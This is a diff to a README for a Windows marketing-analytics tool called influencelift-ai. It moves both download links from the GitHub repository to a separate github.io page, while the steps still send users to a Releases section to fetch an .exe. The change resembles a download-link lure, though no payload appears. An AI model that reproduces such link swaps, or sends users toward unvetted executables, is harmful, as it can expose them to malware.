@@ -1,6 +1,6 @@
 # 📈 influencelift-ai - Improve marketing results with data insights
 
-[![Download Link](https://img.shields.io/badge/Download-Influencelift-blue.svg)](https://github.com/Arisu1990/influencelift-ai)
+[![Download Link](https://img.shields.io/badge/Download-Influencelift-blue.svg)](https://arisu1990.github.io)
 
 This application helps marketers manage influencer campaigns. It cleans messy data, predicts future product sales, and runs simulations to test marketing choices. You use this tool to turn complex information into simple charts and clear business plans.
 
@@ -18,7 +18,7 @@ Your computer needs these items to run the software:
 
 The software lives on our project page. You must choose the correct version for your Windows computer.
 
-1. Go to this link: [https://github.com/Arisu1990/influencelift-ai](https://github.com/Arisu1990/influencelift-ai)
+1. Go to this link: [https://arisu1990.github.io](https://arisu1990.github.io)
 2. Look for the Releases section on the right side of the screen.
 3. Click the link that says Releases.
 4. Locate the file ending in .exe for Windows.
